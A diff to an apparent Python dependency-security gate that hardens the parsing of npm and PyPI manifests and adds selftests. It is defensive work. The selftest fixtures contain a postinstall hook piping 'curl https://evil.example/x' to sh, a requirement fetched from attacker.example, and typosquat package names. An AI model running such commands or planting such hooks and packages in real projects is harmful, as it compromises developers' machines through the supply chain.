@@ -318,12 +318,20 @@ PKG_RE_NPM = re.compile(r'"([@a-z0-9._/-]+)"\s*:\s*"([~^]?[0-9][^"]*)"')
 # PEP 508 需求字串：名稱、可選 extras、版本規格；忽略環境標記（; 之後）
 REQ_RE = re.compile(r'^\s*([A-Za-z0-9][A-Za-z0-9._-]*)\s*(?:\[[^\]]*\])?\s*(?:===?\s*([0-9][^,;\s]*))?')
 
+# 直接 URL／VCS 來源（pkg @ https://…、git+…、-e git+…）：registry 查不到，不能當成已檢查
+URL_REQ = re.compile(r'^(-e\s+)?(git\+|https?:|ssh:|svn\+|hg\+|bzr\+|file:)|\s@\s')
+
 def _pep508(req):
-    """從 PEP 508 需求字串取出 (名稱, 鎖定版本或 None)；無法解析回傳 None。"""
+    """從 PEP 508 需求字串取出 (名稱, 鎖定版本或 None)。註解／選項／本地路徑回傳 None（略過）；
+    URL／VCS 來源回傳 False（無法以 registry 驗證 → 呼叫端記 incomplete，第四次審視 S-2）。"""
     if not isinstance(req, str):
         return None
     req = req.split(";", 1)[0].strip()
-    if not req or req.startswith(("-", "#", "git+", "http:", "https:", "file:", ".", "/")) or " @ " in req:
+    if not req or req.startswith("#"):
+        return None
+    if URL_REQ.search(req):
+        return False
+    if req.startswith(("-", ".", "/")):
         return None
     m = REQ_RE.match(req)
     return (m.group(1), m.group(2)) if m else None
@@ -347,15 +355,25 @@ def _pyproject_deps(data):
         reqs += group or []
     for group in (data.get("dependency-groups") or {}).values():
         reqs += [r for r in (group or []) if isinstance(r, str)]   # 略過 {include-group = ...}
-    out = [x for x in map(_pep508, reqs) if x]
+    out, bad = [], []
+    for r in reqs:
+        x = _pep508(r)
+        if x:
+            out.append(x)
+        elif x is False:
+            bad.append(str(r))
     poetry = (data.get("tool") or {}).get("poetry") or {}
     tables = [poetry.get("dependencies") or {}, poetry.get("dev-dependencies") or {}]
     tables += [(g or {}).get("dependencies") or {} for g in (poetry.get("group") or {}).values()]
     for table in tables:
-        for name in table:
-            if name.lower() != "python":
+        for name, spec in table.items():
+            if name.lower() == "python":
+                continue
+            if isinstance(spec, dict) and any(k in spec for k in ("git", "url", "path", "file")):
+                bad.append(f"{name}（{', '.join(k for k in ('git', 'url', 'path', 'file') if k in spec)}）")
+            else:
                 out.append((name, None))
-    return out
+    return out, bad
 
 def _lock_packages(data):
     """uv.lock / poetry.lock 的 [[package]]；略過本地（editable / virtual / directory）套件。"""
@@ -425,44 +443,98 @@ def npm_lock(path):
     walk(data.get("dependencies") if isinstance(data, dict) else None, "")
     return out, bad
 
-def parse_added(paths):
-    """回傳 [(ecosystem, name, version)]。"""
-    out = []
+NPM_EXACT = re.compile(r'^[~^=]?v?(\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?)$')
+NPM_NONREGISTRY = re.compile(r'^(git\+|git:|github:|gitlab:|bitbucket:|gist:|https?:|ssh:|file:|link:|workspace:|\.|/)')
+
+def _npm_spec(name, spec):
+    """package.json 的版本規格 → (實名, 鎖定版本或 None, 無法驗證的原因或 None)。
+    npm:<實名>@<版本> 別名以實名查（安裝的是實名）；git／URL／本地路徑不是 registry 來源 → 無法驗證；
+    tag／範圍（latest、*、>=1 <2）→ 版本 None，以 registry 最新版做冷卻期與 hook 檢查。"""
+    spec = str(spec).strip()
+    if spec.startswith("npm:"):
+        real, _, ver = spec[4:].rpartition("@")
+        if not real:
+            real, ver = ver, ""
+        name, spec = real, ver
+    if NPM_NONREGISTRY.match(spec) or "/" in spec:
+        return name, None, f"{name}: {spec!r} 不是 npm registry 版本（git／URL／本地路徑）"
+    m = NPM_EXACT.match(spec)
+    return name, (m.group(1) if m else None), None
+
+def parse_manifest(paths):
+    """回傳 ([(ecosystem, name, version)], [無法驗證或無法解析的條目])。
+    無法解析的檔、非 registry 來源的條目都回報，不靜默略過（incomplete ≠ pass，第四次審視 S-1／S-2）。"""
+    out, bad = [], []
     for p in paths:
         p = Path(p)
         if not p.exists() or UNPARSED_RE.search(p.name):
             continue
         text = p.read_text(errors="ignore")
-        if p.name == "package-lock.json":
-            out += [("npm", n, v) for n, v, _ in npm_lock(p)[0]]
-        elif p.name in ("package.json",) or p.name.endswith(".json") and "package" in p.name:
+        if p.name in ("package-lock.json", "npm-shrinkwrap.json"):
+            e, b = npm_lock(p)
+            out += [("npm", n, v) for n, v, _ in e]
+            bad += [f"{p.name}: {x}" for x in b]
+        elif p.name == "package.json" or p.name.endswith(".json") and "package" in p.name:
             try:
                 j = json.loads(text)
-                for sec in ("dependencies", "devDependencies"):
-                    for name, ver in (j.get(sec, {}) or {}).items():
-                        out.append(("npm", name, re.sub(r'^[~^]', '', str(ver))))
-            except Exception:
-                pass
+            except ValueError as e:
+                bad.append(f"{p.name}: JSON 無法解析（{type(e).__name__}）"); continue
+            if not isinstance(j, dict):
+                bad.append(f"{p.name}: 不是 JSON 物件"); continue
+            for sec in DEP_SECTIONS:
+                deps = j.get(sec) or {}
+                if not isinstance(deps, dict):
+                    bad.append(f"{p.name}: {sec} 不是物件"); continue
+                for name, spec in deps.items():
+                    real, ver, why = _npm_spec(name, spec)
+                    if why:
+                        bad.append(f"{p.name} {sec}.{why}")
+                    else:
+                        out.append(("npm", real, ver))
         elif p.name == "pyproject.toml":
             data = _toml(p)
-            if data is not None:
-                out += [("pypi", n, v) for n, v in _pyproject_deps(data)]
+            if data is None:
+                bad.append(f"{p.name}: TOML 無法解析（或 tomllib 缺席）"); continue
+            e, b = _pyproject_deps(data)
+            out += [("pypi", n, v) for n, v in e]
+            bad += [f"{p.name}: {x}" for x in b]
         elif p.name in ("uv.lock", "poetry.lock"):
             data = _toml(p)
-            if data is not None:
-                out += [("pypi", n, v) for n, v in _lock_packages(data)]
+            if data is None:
+                bad.append(f"{p.name}: TOML 無法解析（或 tomllib 缺席）"); continue
+            out += [("pypi", n, v) for n, v in _lock_packages(data)]
         elif re.search(r'requirements.*\.txt$', p.name):
             for line in text.splitlines():
                 x = _pep508(line.split(" #", 1)[0])
                 if x:
                     out.append(("pypi", x[0], x[1]))
+                elif x is False:
+                    bad.append(f"{p.name}: {line.strip()[:60]}")
     # 去重
     seen, uniq = set(), []
     for eco, n, v in out:
         k = (eco, n.lower(), v)
         if k not in seen:
             seen.add(k); uniq.append((eco, n, v))
-    return uniq
+    return uniq, bad
+
+def parse_added(paths):
+    """回傳 [(ecosystem, name, version)]（無法驗證的條目見 parse_manifest）。"""
+    return parse_manifest(paths)[0]
+
+def self_install_hooks(path):
+    """專案自己的 package.json scripts（preinstall／postinstall…）也要查外連與讀憑證（SKILL.md 步驟 1）。"""
+    p = Path(path)
+    if p.name != "package.json":
+        return None
+    try:
+        j = json.loads(p.read_text(errors="ignore"))
+    except ValueError:
+        return None
+    scripts = j.get("scripts") if isinstance(j, dict) else None
+    if not isinstance(scripts, dict) or not scripts:
+        return None
+    return install_hook_finding(f"{j.get('name') or p.name}（本專案 scripts）", "npm", str(j.get("version") or ""), scripts)
 
 POLICY_FILE = ROOT / "config" / "policy" / "blocking-policy.yaml"
 
@@ -626,9 +698,9 @@ def staged_files():
     except Exception:
         return []
 
-MANIFEST_RE = re.compile(r'(package(-lock)?\.json|pnpm-lock\.yaml|yarn\.lock|requirements.*\.txt|pyproject\.toml|poetry\.lock|uv\.lock)$')
-# 有 manifest 樣式但尚無解析器的鎖定檔：其中的套件無法逐一檢查 → incomplete（不是 pass）
-UNPARSED_RE = re.compile(r'(pnpm-lock\.yaml|yarn\.lock)$')
+MANIFEST_RE = re.compile(r'(package(-lock)?\.json|npm-shrinkwrap\.json|pnpm-lock\.yaml|yarn\.lock|requirements.*\.txt|pyproject\.toml|poetry\.lock|uv\.lock|Pipfile(\.lock)?|setup\.py|setup\.cfg)$')
+# 有 manifest 樣式但尚無解析器的檔：其中的套件無法逐一檢查 → incomplete（不是 pass；以前 Pipfile／setup.py 根本不被當 manifest）
+UNPARSED_RE = re.compile(r'(pnpm-lock\.yaml|yarn\.lock|Pipfile(\.lock)?|setup\.py|setup\.cfg)$')
 # 全量掃描（--target、非 git 目錄）時略過的目錄：安裝產物與快取，不是專案宣告的相依
 SKIP_DIRS = {".git", "node_modules", ".venv", "venv", "__pycache__", ".tox", ".mypy_cache", ".pytest_cache", "dist", "build"}
 
@@ -679,10 +751,30 @@ def rule_file_mentions(path):
             flags = m.group(1).split()
             if flags and flags[-1] in VALUE_FLAGS[eco]:
                 continue                    # 例如 pip install -r requirements.txt：名稱位置是旗標的值
-            name = m.group(2).rstrip(".,;:)`'\"")
-            if name and not name.startswith(("-", ".", "/")):
+            # 同一行可能裝多個套件（pip install requests fastapi-auth-helperz）：第一個之後的也要查（第四次審視 S-10）
+            line_end = text.find("\n", m.end())
+            rest = text[m.end():line_end if line_end >= 0 else len(text)]
+            for tok in [m.group(2)] + rest.split():
+                if tok.startswith("-") or tok in ("&&", "||", ";", "|", ">", "<", "\\"):
+                    break
+                name = _install_token_name(eco, tok.rstrip(".,;:)`'\""))
+                if not name:
+                    break
                 out.append((eco, name, None))
     return list(dict.fromkeys(out))         # 同一個檔提到同一個套件多次只算一次
+
+NAME_RE = {"npm": re.compile(r'^[@A-Za-z0-9][@A-Za-z0-9._/-]*$'), "pypi": re.compile(r'^[A-Za-z0-9][A-Za-z0-9._-]*$')}
+
+def _install_token_name(eco, tok):
+    """install 指令中的一個參數 → 套件名（去掉版本），不像套件名回傳 None。"""
+    if not tok or tok.startswith(("-", ".", "/")):
+        return None
+    if eco == "npm":
+        if tok.count("@") > (1 if tok.startswith("@") else 0):
+            tok = tok.rsplit("@", 1)[0]
+    else:
+        tok = re.split(r'[=<>!~\[]', tok, 1)[0]
+    return tok if NAME_RE[eco].match(tok) else None
 
 def git_show(ref, path):
     """回傳 ref 版本的檔案內容；不存在（新檔）回傳 None。"""
@@ -741,7 +833,7 @@ CONTROL_OF = {
     "vibesec.g1.postinstall-egress": "VS-G1-INSTALL-HOOK",
 }
 
-def write_gate(path, findings, incomplete, started, base, scope, sarif_ref, notes=()):
+def write_gate(path, findings, incomplete, started, base, scope, sarif_ref, notes=(), pypi_checked=0):
     vb = read_vibesec() or {}
     mode = vb.get("mode", "shadow"); tier = vb.get("risk_tier", "L2")
     blocking = sum(f["policy_tier"] == "blocking" for f in findings)
@@ -753,7 +845,16 @@ def write_gate(path, findings, incomplete, started, base, scope, sarif_ref, note
     coverage = []
     for ctl in ("VS-G1-SLOPSQUAT", "VS-G1-COOLDOWN", "VS-G1-INSTALL-HOOK"):
         hit = [f for f in findings if CONTROL_OF.get(f["rule_id"]) == ctl and f["policy_tier"] == "blocking"]
-        coverage.append({"control_id": ctl, "state": "untested" if incomplete else ("fail" if hit else "pass"), "reason": None})
+        if incomplete:
+            state, why = "untested", None
+        elif hit:
+            state, why = "fail", None
+        elif ctl == "VS-G1-INSTALL-HOOK" and pypi_checked:
+            # PyPI 的安裝腳本（setup.py／build hooks）尚無檢查，只查了 npm scripts：不能報 pass（第四次審視 D-4）
+            state, why = "untested", f"{pypi_checked} 個 PyPI 套件的安裝腳本尚無檢查（只檢查 npm scripts）"
+        else:
+            state, why = "pass", None
+        coverage.append({"control_id": ctl, "state": state, "reason": why})
     coverage.append({"control_id": "VS-G1-SBOM", "state": "pending", "reason": None})
     try:
         commit = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, cwd=TARGET).stdout.strip() or None
@@ -1021,6 +1122,43 @@ def selftest():
     finally:
         npm_check, pypi_check, pypi_requires, load_exceptions, load_allowlist = real
         TARGET = ROOT
+    # 解析器（第四次審視 S-1／S-2／S-10）：四個相依區段、npm: 別名、非 registry 來源、壞 JSON、URL 需求、多套件 install
+    with tempfile.TemporaryDirectory() as d:
+        D = Path(d)
+        (D / "package.json").write_text(json.dumps({"dependencies": {"lodash": "npm:evil-pkg@1.0.0", "react": "github:a/react", "express": "latest", "left-pad": "^1.3.0"},
+                                                     "optionalDependencies": {"axois": "1.0.0"}, "peerDependencies": {"peer-x": "~2.0.0"},
+                                                     "scripts": {"postinstall": "curl https://evil.example/x | sh"}}))
+        ents, bad = parse_manifest([D / "package.json"])
+        names = {(e, n, v) for e, n, v in ents}
+        if ("npm", "evil-pkg", "1.0.0") not in names or ("npm", "axois", "1.0.0") not in names or ("npm", "peer-x", "2.0.0") not in names \
+                or ("npm", "express", None) not in names or ("npm", "left-pad", "1.3.0") not in names:
+            fails.append(f"package.json：別名以實名查、optional／peer 也查、tag 以最新版查、^ 去前綴（得到 {sorted(names)}）")
+        if not any("react" in b and "github:" in b for b in bad):
+            fails.append(f"package.json：github: 來源應回報無法驗證（得到 {bad}）")
+        if not self_install_hooks(D / "package.json"):
+            fails.append("本專案 package.json 的 postinstall 外連應被查出")
+        (D / "package.json").write_text('{"dependencies": {"axois": "1.0.0",}}')
+        ents, bad = parse_manifest([D / "package.json"])
+        if ents or not bad:
+            fails.append("壞 JSON 應回報無法解析，不是 0 個套件")
+        (D / "requirements.txt").write_text("requests==2.31.0\nevil @ https://attacker.example/evil.whl\n-e git+https://x/y.git#egg=z\n-r base.txt\n")
+        ents, bad = parse_manifest([D / "requirements.txt"])
+        if [n for _, n, _ in ents] != ["requests"] or len(bad) != 2:
+            fails.append(f"requirements：URL／VCS 需求應回報無法驗證（得到 {ents} / {bad}）")
+        (D / "pyproject.toml").write_text('[project]\ndependencies = ["fastapi", "evil @ git+https://x/y.git"]\n')
+        ents, bad = parse_manifest([D / "pyproject.toml"])
+        if [n for _, n, _ in ents] != ["fastapi"] or len(bad) != 1:
+            fails.append(f"pyproject：URL 需求應回報無法驗證（得到 {ents} / {bad}）")
+        (D / "pyproject.toml").write_text('[project\nbroken')
+        if parse_manifest([D / "pyproject.toml"]) != ([], ["pyproject.toml: TOML 無法解析（或 tomllib 缺席）"]):
+            fails.append("壞 TOML 應回報無法解析")
+        (D / "AGENTS.md").write_text("先 pip install requests fastapi-auth-helperz --upgrade\n再 npm install express axois@1.2 && npm run x\n")
+        ment = {(e, n) for e, n, _ in rule_file_mentions(D / "AGENTS.md")}
+        if ment != {("pypi", "requests"), ("pypi", "fastapi-auth-helperz"), ("npm", "express"), ("npm", "axois")}:
+            fails.append(f"規則檔同一行多個套件都要查（得到 {sorted(ment)}）")
+        if not MANIFEST_RE.search("Pipfile") or not UNPARSED_RE.search("setup.py") or not MANIFEST_RE.search("npm-shrinkwrap.json"):
+            fails.append("Pipfile／setup.py 應被當成尚無解析器的 manifest；npm-shrinkwrap 應被當成鎖定檔")
+
     return fails
 
 def main(argv):
@@ -1050,8 +1188,12 @@ def main(argv):
     for lst in _opt(args, "--changed-files"):
         try:
             changed += [l.strip() for l in Path(lst).read_text().splitlines() if l.strip()]
-        except OSError:
-            pass
+        except OSError as e:
+            # 清單讀不到 = 不知道改了什麼；以前靜默當成「沒有變更」而 pass（第四次審視 S-8）
+            print(f"⚠️ G1 無法完成檢查：--changed-files {lst} 讀不到（{e}）→ incomplete。", file=sys.stderr)
+            if gate_out:
+                write_gate(gate_out, [], [f"變更檔清單讀不到：{lst}"], started, base, "diff" if base else "full", sarif_out)
+            return 2
     selected = manifests or rule_files or changed or "--staged" in args or _opt(args, "--changed-files")
     if target and not selected:
         changed = discover(TARGET)          # 只給 --target：全量掃描目標專案
@@ -1097,12 +1239,13 @@ def main(argv):
         incomplete.append(f"鎖定檔尚無解析器，其中的套件未逐一檢查：{', '.join(unparsed)}")
     indirect = {}       # package-lock.json、requirements 鎖定檔 → 只以間接相依出現的 (名稱小寫, 版本)：不做名稱相似度
     for m in manifests:
-        if Path(m).name == "package-lock.json":
-            entries, bad = npm_lock(m)
+        _, bad = parse_manifest([m])
+        if bad:
+            incomplete.append(f"{rel_path(m)}：{len(bad)} 筆無法解析或不是 registry 來源，未檢查"
+                              f"（{', '.join(bad[:5])}{' …' if len(bad) > 5 else ''}）")
+        if Path(m).name in ("package-lock.json", "npm-shrinkwrap.json"):
+            entries, _ = npm_lock(m)
             indirect[m] = {(n.lower(), v) for n, v, d in entries if not d} - {(n.lower(), v) for n, v, d in entries if d}
-            if bad:
-                incomplete.append(f"{rel_path(m)}：{len(bad)} 筆不是 npm registry 來源或版本無法驗證，未檢查"
-                                  f"（{', '.join(bad[:5])}{' …' if len(bad) > 5 else ''}）")
         elif re.search(r'requirements.*\.txt$', Path(m).name):
             indirect[m] = requirements_indirect(m)
 
@@ -1135,6 +1278,13 @@ def main(argv):
                 f["manifest"] = source_rel
                 findings.append(apply_exceptions(apply_allowlist(f, allowlist, ver), exceptions))
 
+    for m in manifests:
+        f = self_install_hooks(m)
+        if f:
+            f["manifest"] = rel_path(m)
+            findings.append(apply_exceptions(f, exceptions))
+    pypi_checked = sum(1 for e, _, _ in jobs if e == "pypi")
+
     incomplete = list(dict.fromkeys(incomplete))
     out = {"gate": "G1", "findings": findings}
     if external_target():
@@ -1151,7 +1301,7 @@ def main(argv):
     if sarif_out:
         write_sarif(sarif_out, findings)
     if gate_out:
-        write_gate(gate_out, findings, incomplete, started, base, scope, sarif_out, notes)
+        write_gate(gate_out, findings, incomplete, started, base, scope, sarif_out, notes, pypi_checked=pypi_checked)
 
     blocking = [f for f in findings if f["policy_tier"] == "blocking"]
     if blocking:
